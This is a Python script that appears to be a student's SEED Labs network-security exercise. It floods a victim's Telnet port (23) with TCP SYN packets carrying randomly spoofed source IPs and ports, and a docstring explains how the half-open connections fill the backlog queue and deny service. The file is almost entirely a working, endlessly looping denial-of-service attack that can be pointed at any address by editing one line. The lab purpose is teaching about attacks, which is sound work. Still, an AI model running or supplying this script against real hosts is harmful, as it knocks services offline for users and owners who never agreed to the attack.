#!/usr/bin/env python3
"""
Task 1.1 — SYN Flooding Attack (Python)
Author: Naga Jyothi Mahankali
Course: Network Security — SEED Labs

How it works:
  Sends a continuous stream of TCP SYN packets with random spoofed source
  IPs and random source ports to the victim's Telnet port (23).
  Each SYN causes the victim to allocate a half-open connection entry in
  its SYN backlog queue. Because the spoofed sources never complete the
  three-way handshake, the queue fills up and legitimate clients are denied.
"""

from scapy.all import IP, TCP, send, RandShort
import random

# ── Configuration ──────────────────────────────────────────────────────────────
VICTIM_IP   = "10.9.0.5"   # Target victim IP (change to your lab victim IP)
VICTIM_PORT = 23            # Telnet port
# ───────────────────────────────────────────────────────────────────────────────

def random_ip():
    """Generate a random routable-looking source IP."""
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

print(f"[*] Starting SYN Flood attack on {VICTIM_IP}:{VICTIM_PORT}")
print("[*] Press Ctrl+C to stop\n")

count = 0
while True:
    src_ip   = random_ip()
    src_port = random.randint(1024, 65535)

    # Craft the SYN packet with a random spoofed source
    ip  = IP(src=src_ip, dst=VICTIM_IP)
    tcp = TCP(sport=src_port, dport=VICTIM_PORT, flags="S",
              seq=random.randint(1000, 9000))
    pkt = ip / tcp

    send(pkt, verbose=0)
    count += 1
    if count % 100 == 0:
        print(f"[*] Sent {count} SYN packets...")
